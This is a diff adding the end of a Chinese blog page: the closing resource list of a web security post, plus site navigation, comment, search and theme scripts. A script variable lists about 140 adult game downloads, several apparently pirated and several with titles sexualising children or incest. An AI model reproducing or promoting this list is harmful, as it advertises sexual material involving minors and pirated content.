+<li><strong>OWASP Top 10</strong>：<a target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></li>
+<li><strong>PortSwigger Web Security Academy</strong>：在线攻防实验室</li>
+<li><strong>HackTheBox &#x2F; TryHackMe</strong>：实战渗透平台</li>
+<li><strong>《白帽子讲 Web 安全》</strong>（吴翰清）— 国内经典入门书</li>
+<li><strong>《Web 安全攻防：渗透测试实战指南》</strong></li>
+<li><strong>Kali Linux</strong>：渗透测试专用系统</li>
+<li><strong>CVE 漏洞库</strong>：<a target="_blank" rel="noopener" href="https://cve.mitre.org/">https://cve.mitre.org/</a></li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>记住：</strong> 安全不是一次性配置，而是一个持续的过程。保持学习，关注新的 CVE 漏洞，定期做安全审计，才能让你的系统更健壮 💪</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+<nav class="post-nav">
+  
+  <a class="prev" href="/computer-science/ai-tools/Hermes-Agent-%E9%AB%98%E9%98%B6%E7%94%A8%E6%B3%95/">上一篇：Hermes Agent 高阶用法 —— 打造你的专属 AI 工作流</a>
+  
+  
+  <a class="next" href="/computer-science/ai-tools/AI%E6%97%A5%E6%8A%A5-2026-05-08/">下一篇：AI 日报 2026-05-08</a>
+  
+</nav>
+
+
+
+<div class="post-comments" id="comments">
+  <script>
+  (function() {
+    var s = document.createElement('script');
+    s.src = 'https://giscus.app/client.js';
+    s.setAttribute('data-repo', 'Scottalive/scottalive.github.io');
+    s.setAttribute('data-repo-id', 'R_kgDOJOvmZg');
+    s.setAttribute('data-category', 'General');
+    s.setAttribute('data-category-id', 'DIC_kwDOJOvmZs4C7utF');
+    s.setAttribute('data-mapping', 'pathname');
+    s.setAttribute('data-strict', '0');
+    s.setAttribute('data-reactions-enabled', '1');
+    s.setAttribute('data-emit-metadata', '0');
+    s.setAttribute('data-input-position', 'bottom');
+    s.setAttribute('data-theme', window.__theme === 'dark' ? 'dark' : 'light');
+    s.setAttribute('data-lang', 'zh-CN');
+    s.setAttribute('data-loading', 'lazy');
+    s.setAttribute('crossorigin', 'anonymous');
+    document.getElementById('comments').appendChild(s);
+  })();
+  </script>
+</div>
+
+
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container">
+      <p>&copy; 2026 沉鱼 &nbsp;|&nbsp; 访客 <span id="site-uv">-</span> &nbsp;|&nbsp; 浏览 <span id="site-pv">-</span></p>
+    </div>
+  </footer>
+
+  <script>
+  window.__downloads = [{"title":"GCG-4995669932716","url":"/downloads/"},{"title":"Lost2","url":"/downloads/"},{"title":"LostFind","url":"/downloads/"},{"title":"Lovekami -Healing Harem-","url":"/downloads/"},{"title":"MIss Neko1","url":"/downloads/"},{"title":"Miss Neko 2","url":"/downloads/"},{"title":"Miss Neko3","url":"/downloads/"},{"title":"NTR模拟游戏","url":"/downloads/"},{"title":"PazzleSchool2 v1.9.1","url":"/downloads/"},{"title":"RJ01326567","url":"/downloads/"},{"title":"RenaiHajime","url":"/downloads/"},{"title":"Tsukiniyorisou2","url":"/downloads/"},{"title":"X爱调教","url":"/downloads/"},{"title":"[110701][暁WORKS-響-] LOVELY×CATION","url":"/downloads/"},{"title":"[120727][ωstar] 美少女万華鏡 -忘れな草と永遠の少女 (无码)","url":"/downloads/"},{"title":"[130426][hibiki works] LOVELY×CATION2","url":"/downloads/"},{"title":"[140228][ωstar] 美少女万華鏡 -かつて少女だった君へ (无码)","url":"/downloads/"},{"title":"[210924][HULOTTE] 俺の恋天使がポンコツすぎてコワ～い。无码版","url":"/downloads/"},{"title":"[211210][Shiravune] 桃色恋恋～姉妹とつむぐエッチな関係～ steam版 (files)","url":"/downloads/"},{"title":"[220813][Whirlpool] けもの道☆ガーリッシュスクエア LOVE+PLUS 无码 steam版 (files)","url":"/downloads/"},{"title":"[230520][Kagura Games] 新生 むっち無知 田舎性活 steam版 (files)","url":"/downloads/"},{"title":"[230526][Whisp] ガマンができない童貞兄キと、スナオになれない反抗妹 steam版 (files)","url":"/downloads/"},{"title":"[云翻]我的女朋友不可能是超H班主任(无码)","url":"/downloads/"},{"title":"blacksouls","url":"/downloads/"},{"title":"deepconversation","url":"/downloads/"},{"title":"flip_flop","url":"/downloads/"},{"title":"kasiki","url":"/downloads/"},{"title":"meierzhoumu","url":"/downloads/"},{"title":"meimei","url":"/downloads/"},{"title":"meimeitongju","url":"/downloads/"},{"title":"☆援助妊娠學園☆ V1.2","url":"/downloads/"},{"title":"【SLG动态 触摸 萝莉】双子睡眠すやすやえっち[Ver1.01]","url":"/downloads/"},{"title":"その花びらにくちづけを11 无码版","url":"/downloads/"},{"title":"上班族","url":"/downloads/"},{"title":"不双休就死","url":"/downloads/"},{"title":"与妹妹两人的生活","url":"/downloads/"},{"title":"与妹妹同居","url":"/downloads/"},{"title":"与妹妹的一个月","url":"/downloads/"},{"title":"与妹妹的保健室","url":"/downloads/"},{"title":"与妹妹的周末","url":"/downloads/"},{"title":"与小萝莉相思相爱","url":"/downloads/"},{"title":"催眠","url":"/downloads/"},{"title":"催眠少女","url":"/downloads/"},{"title":"傲娇妹妹","url":"/downloads/"},{"title":"傲慢少女","url":"/downloads/"},{"title":"兄妹秘哀～口嫌体正直～","url":"/downloads/"},{"title":"刘禅养成计划","url":"/downloads/"},{"title":"千恋万花","url":"/downloads/"},{"title":"只奈","url":"/downloads/"},{"title":"吉里吉里Z Ver1.4.0 リリース","url":"/downloads/"},{"title":"后宫","url":"/downloads/"},{"title":"和妹妹一起生活吧","url":"/downloads/"},{"title":"和存在感微薄少女一起的简单生活","url":"/downloads/"},{"title":"和毒舌且帅气的妹妹做爱～哥哥这个变态、大变态，负起责任让我怀孕啊！～","url":"/downloads/"},{"title":"回乡","url":"/downloads/"},{"title":"回乡2","url":"/downloads/"},{"title":"回想","url":"/downloads/"},{"title":"图书馆","url":"/downloads/"},{"title":"在叔叔家玩吧","url":"/downloads/"},{"title":"地下偶像教育录","url":"/downloads/"},{"title":"地雷酱","url":"/downloads/"},{"title":"堕落电车","url":"/downloads/"},{"title":"堕落皇家圣女","url":"/downloads/"},{"title":"夏之音","url":"/downloads/"},{"title":"夏天的小秘密","url":"/downloads/"},{"title":"夏編","url":"/downloads/"},{"title":"天使的纷扰","url":"/downloads/"},{"title":"妹妹-1","url":"/downloads/"},{"title":"妹妹养成","url":"/downloads/"},{"title":"妹妹勇者","url":"/downloads/"},{"title":"妹妹和朋友与我的日常","url":"/downloads/"},{"title":"妹嫁 ～妹妹新娘～","url":"/downloads/"},{"title":"妹寝","url":"/downloads/"},{"title":"妹爱","url":"/downloads/"},{"title":"姐姐","url":"/downloads/"},{"title":"孕育","url":"/downloads/"},{"title":"学园","url":"/downloads/"},{"title":"学园偶像","url":"/downloads/"},{"title":"家出少女","url":"/downloads/"},{"title":"家里蹲义妹","url":"/downloads/"},{"title":"希尔薇PC","url":"/downloads/"},{"title":"带我去地下城吧","url":"/downloads/"},{"title":"彼女","url":"/downloads/"},{"title":"怀孕无双！色色生活~让1000名女孩怀孕","url":"/downloads/"},{"title":"恋爱 X 决胜战 茉莉 & 汐音 & 苍 小故事(新米,繁体)","url":"/downloads/"},{"title":"我爱上了班里的一个妹子","url":"/downloads/"},{"title":"我的暑假时光","url":"/downloads/"},{"title":"搜查官莉娜","url":"/downloads/"},{"title":"新妻LOVELY×CATION(全汉)","url":"/downloads/"},{"title":"时间停止","url":"/downloads/"},{"title":"栏中","url":"/downloads/"},{"title":"毁灭之地的勇者","url":"/downloads/"},{"title":"永恒","url":"/downloads/"},{"title":"洛丽塔","url":"/downloads/"},{"title":"清纯大小姐催眠","url":"/downloads/"},{"title":"爪子小巷小羊","url":"/downloads/"},{"title":"爱与恶魔","url":"/downloads/"},{"title":"特工","url":"/downloads/"},{"title":"犬娘","url":"/downloads/"},{"title":"狂之血 SaDistic BlooD(无码)","url":"/downloads/"},{"title":"狐狸屋部","url":"/downloads/"},{"title":"理想中的父亲","url":"/downloads/"},{"title":"痴汉","url":"/downloads/"},{"title":"痴汉内向女高","url":"/downloads/"},{"title":"社区审查","url":"/downloads/"},{"title":"紫宫迷宫","url":"/downloads/"},{"title":"美少女万华镜1-被诅咒之传说少女","url":"/downloads/"},{"title":"美少女万华镜2.5-献给曾经是少女的你","url":"/downloads/"},{"title":"美少女万华镜3-神明所创造的少女们","url":"/downloads/"},{"title":"美少女万华镜4-罪与罚的少女","url":"/downloads/"},{"title":"美少女万华镜5-理与迷宫的少女","url":"/downloads/"},{"title":"美少女万華鏡 -忘れな草と永遠の少女-","url":"/downloads/"},{"title":"美少女万華鏡異聞 雪おんな","url":"/downloads/"},{"title":"苦主","url":"/downloads/"},{"title":"苦主3","url":"/downloads/"},{"title":"莉可的不可思议差事","url":"/downloads/"},{"title":"萝怀孕","url":"/downloads/"},{"title":"萝莉吸血鬼!~与吸血鬼姐妹的性福生活～","url":"/downloads/"},{"title":"萝莉妹妹非要用","url":"/downloads/"},{"title":"虚拟女孩","url":"/downloads/"},{"title":"表妹","url":"/downloads/"},{"title":"角折魔王エリスの再生譚","url":"/downloads/"},{"title":"触摸","url":"/downloads/"},{"title":"触摸互动","url":"/downloads/"},{"title":"调皮生魂少女","url":"/downloads/"},{"title":"踏ちっ娘☆まいろーど","url":"/downloads/"},{"title":"车万同人","url":"/downloads/"},{"title":"这位小姐，触摸","url":"/downloads/"},{"title":"邻座的女同学","url":"/downloads/"},{"title":"银习的幽世村 Ver1.34官方中文步兵版-PC","url":"/downloads/"},{"title":"驯化雌小鬼","url":"/downloads/"},{"title":"骄傲少女","url":"/downloads/"},{"title":"鬼娘乱舞","url":"/downloads/"},{"title":"魅魔莉莉姆","url":"/downloads/"},{"title":"魔法少女","url":"/downloads/"}];
+  </script>
+  <script>
+  /* search */
+  (function() {
+    var input = document.getElementById('search-input');
+    var results = document.getElementById('search-results');
+    var posts = null;
+    var idx = {};
+
+    input.addEventListener('focus', function() {
+      if (!posts) loadData();
+    });
+
+    input.addEventListener('input', function() {
+      var q = this.value.trim();
+      if (q.length < 2) { results.innerHTML = ''; results.classList.remove('show'); return; }
+      if (!posts) { loadData(function() { doSearch(q); }); return; }
+      doSearch(q);
+    });
+
+    document.addEventListener('click', function(e) {
+      if (!e.target.closest('.search-box')) results.classList.remove('show');
+    });
+
+    function loadData(cb) {
+      fetch('/search.json')
+        .then(function(r) { return r.json(); })
+        .then(function(json) {
+          posts = json;
+          json.forEach(function(item, i) { idx['p' + i] = { text: (item.title + ' ' + strip(item.content || '')).toLowerCase(), item: item }; });
+          (window.__downloads || []).forEach(function(item, i) {
+            idx['d' + i] = { text: item.title.toLowerCase(), item: item };
+          });
+          if (cb) cb();
+        });
+    }
+
+    function strip(html) {
+      var tmp = document.createElement('div');
+      tmp.innerHTML = html;
+      return tmp.textContent || tmp.innerText || '';
+    }
+
+    function doSearch(q) {
+      q = q.toLowerCase();
+      var hits = [];
+      Object.keys(idx).forEach(function(k) {
+        var score = 0;
+        var pos = idx[k].text.indexOf(q);
+        if (pos !== -1) {
+          score = pos === 0 ? 100 : 100 - pos;
+          hits.push({ idx: k, score: score });
+        }
+      });
+      hits.sort(function(a, b) { return b.score - a.score; });
+      hits = hits.slice(0, 8);
+
+      if (hits.length === 0) {
+        results.innerHTML = '<div class="search-empty">没有找到结果</div>';
+      } else {
+        results.innerHTML = hits.map(function(h) {
+          var entry = idx[h.idx];
+          var item = entry.item;
+          var isDownload = h.idx.charAt(0) === 'd';
+          var sub = isDownload ? '<span class="search-tag">资源下载</span>' : '<span class="search-excerpt">' + excerpt(item.content, q, 80) + '</span>';
+          return '<a class="search-item" href="' + item.url + '">' +
+            '<span class="search-title">' + highlight(item.title, q) + '</span>' + sub +
+          '</a>';
+        }).join('');
+      }
+      results.classList.add('show');
+    }
+
+    function highlight(text, q) {
+      var re = new RegExp('(' + escapeRegExp(q) + ')', 'gi');
+      return text.replace(re, '<mark>$1</mark>');
+    }
+
+    function excerpt(html, q, len) {
+      var text = strip(html);
+      var pos = text.toLowerCase().indexOf(q.toLowerCase());
+      if (pos === -1) pos = 0;
+      var start = Math.max(0, pos - 30);
+      var snippet = text.substring(start, start + len);
+      if (start > 0) snippet = '...' + snippet;
+      if (start + len < text.length) snippet += '...';
+      return highlight(snippet, q);
+    }
+
+    function escapeRegExp(s) {
+      return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+    }
+  })();
+  </script>
+
+  <script>
+  /* back to top */
+  (function() {
+    var btn = document.getElementById('back-to-top');
+    window.addEventListener('scroll', function() {
+      btn.classList.toggle('show', window.scrollY > 400);
+    });
+    btn.addEventListener('click', function() {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    });
+  })();
+  </script>
+
+  <script>
+  /* dark mode toggle */
+  (function() {
+    var btn = document.getElementById('dark-toggle');
+    function notifyGiscus(theme) {
+      var iframe = document.querySelector('.giscus-frame');
+      if (!iframe) return;
+      iframe.contentWindow.postMessage({ giscus: { setConfig: { theme: theme } } }, 'https://giscus.app');
+    }
+    btn.addEventListener('click', function() {
+      var currentlyDark = document.documentElement.getAttribute('data-theme') === 'dark';
+      var next = currentlyDark ? '' : 'dark';
+      document.documentElement.setAttribute('data-theme', next);
+      localStorage.setItem('theme', next || 'light');
+      window.__theme = next || 'light';
+      notifyGiscus(next || 'light');
+    });
+  })();
+  </script>
+
+  <script>
+  /* lightbox */
+  (function() {
+    document.addEventListener('click', function(e) {
+      var img = e.target.closest('.post-content img');
+      if (!img || img.closest('a')) return;
+      if (document.querySelector('.lightbox-overlay')) return;
+
+      var overlay = document.createElement('div');
+      overlay.className = 'lightbox-overlay';
+      var clone = document.createElement('img');
+      clone.src = img.src;
+      clone.alt = img.alt || '';
+      clone.className = 'lightbox-img';
+      overlay.appendChild(clone);
+      document.body.appendChild(overlay);
+
+      overlay.addEventListener('click', function() { overlay.remove(); });
+      document.addEventListener('keydown', function esc(e) {
+        if (e.key === 'Escape') { overlay.remove(); document.removeEventListener('keydown', esc); }
+      });
+    });
+  })();
+  </script>
+
+  <script>
+  /* code block copy button */
+  (function() {
+    document.querySelectorAll('.post-content pre').forEach(function(pre) {
+      var wrap = document.createElement('div');
+      wrap.style.position = 'relative';
+      pre.parentNode.insertBefore(wrap, pre);
+      wrap.appendChild(pre);
+
+      var btn = document.createElement('button');
+      btn.className = 'copy-btn';
+      btn.textContent = '复制';
+      btn.addEventListener('click', function() {
+        var text = pre.querySelector('code') ? pre.querySelector('code').innerText : pre.innerText;
+        navigator.clipboard.writeText(text).then(function() {
+          btn.textContent = '已复制';
+          btn.classList.add('copied');
+          setTimeout(function() {
+            btn.textContent = '复制';
+            btn.classList.remove('copied');
+          }, 2000);
+        });
+      });
+      wrap.appendChild(btn);
+    });
+  })();
+  </script>
+
+  <!-- Mermaid 流程图 -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+  <script>
+  (function() {
+    var isDark = document.documentElement.getAttribute('data-theme') === 'dark';
+    mermaid.initialize({
+      startOnLoad: false,
+      theme: isDark ? 'dark' : 'default',
+      securityLevel: 'loose'
+    });
+
+    async function renderMermaid() {
+      var blocks = document.querySelectorAll('.post-content pre code.language-mermaid');
+      for (var i = 0; i < blocks.length; i++) {
+        var code = blocks[i];
+        var pre = code.parentElement;
+        if (pre.dataset.mermaidRendered) continue;
+        pre.dataset.mermaidRendered = '1';
+
+        var origCode = code.textContent;
+        var container = document.createElement('div');
+        container.className = 'mermaid-container';
+        container.setAttribute('data-orig', origCode);
+        container.textContent = origCode;
+        pre.parentNode.replaceChild(container, pre);
+
+        try {
+          await mermaid.run({ nodes: [container] });
+        } catch(e) {
+          container.innerHTML = '<pre class="mermaid-error">Mermaid 图表语法错误: ' + e.message + '</pre>';
+          container.removeAttribute('data-orig');
+        }
+      }
+    }
+
+    renderMermaid();
+
+    /* 主题切换时重新渲染 mermaid */
+    var darkToggle = document.getElementById('dark-toggle');
+    if (darkToggle) {
+      var origClick = darkToggle.onclick;
+      darkToggle.addEventListener('click', function() {
+        setTimeout(async function() {
+          var containers = document.querySelectorAll('.mermaid-container[data-orig]');
+          for (var i = 0; i < containers.length; i++) {
+            var el = containers[i];
+            el.removeAttribute('data-processed');
+            el.innerHTML = '';
+            el.textContent = el.getAttribute('data-orig');
+          }
+          var isDark = document.documentElement.getAttribute('data-theme') === 'dark';
+          mermaid.initialize({
+            startOnLoad: false,
+            theme: isDark ? 'dark' : 'default',
+            securityLevel: 'loose'
+          });
+          if (containers.length > 0) {
+            try { await mermaid.run({ nodes: Array.from(containers) }); } catch(e) {}
+          }
+        }, 150);
+      });
+    }
+  })();
+  </script>
+
+  <!-- 统计 API 待接入 -->
+  <script>
+  /* TODO: 接入自建统计 API，更新 #site-pv 和 #site-uv */
+  </script>
+</body>
+</html>
